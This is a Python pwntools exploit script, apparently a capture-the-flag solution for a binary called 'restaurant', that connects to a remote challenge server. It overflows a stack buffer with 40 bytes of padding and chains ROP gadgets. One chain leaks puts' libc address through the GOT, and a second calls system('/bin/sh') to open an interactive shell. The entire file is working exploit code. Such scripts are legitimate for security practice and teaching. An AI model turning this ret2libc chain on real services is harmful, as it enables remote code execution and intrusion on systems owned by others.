#!/usr/bin/env python3

from pwn import *

exe = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process(['strace', '-o', 'strace.out', exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("159.65.20.166", 31170)

    return r


def main():
    r = conn()
    r.recvline()
    r.recvline()
    r.recvline()
    r.sendline('1')
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()

    fill_ret = p64(0x0000000000400ff3)
    pop_rdi_ret_gadget = p64(0x00000000004010a3)
    ret_gadget = p64(0x000000000040063e)
    puts_got = p64(0x601fa8);
    puts_plt = p64(0x400650);
    main_addr = p64(0x0000000000400f68);
    puts_libc_offset = 0x80aa0;
    # Let's leak libc base and then return back to fill function
    payload = b"A"*40
    payload += pop_rdi_ret_gadget
    payload += puts_got # Leak address of puts
    payload += puts_plt # and jump to puts
    payload += main_addr # return to main

    f = open("./payload.txt", "wb");
    f.write(b"1\n"+payload+b'\n')
    f.close()

    r.sendline(payload);
    r.recvline()
    data = r.recvline().strip();
    print("Got data: "+str(data) + " with len "+str(len(data)));
    data = u64(data[-6:].ljust(8, b"\x00"));
    print("Leaked: "+hex(data));

    r.recvline()
    r.sendline('1')

    libc_base = data - puts_libc_offset

    # This will be once we know libc base
    bin_sh_str = p64(libc_base + 0x1b3e1a)
    system_ptr = p64(libc_base + 0x4f550)

    payload = b"A"*40
    payload += pop_rdi_ret_gadget
    payload += bin_sh_str
    payload += ret_gadget
    payload += system_ptr
    payload += fill_ret


    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()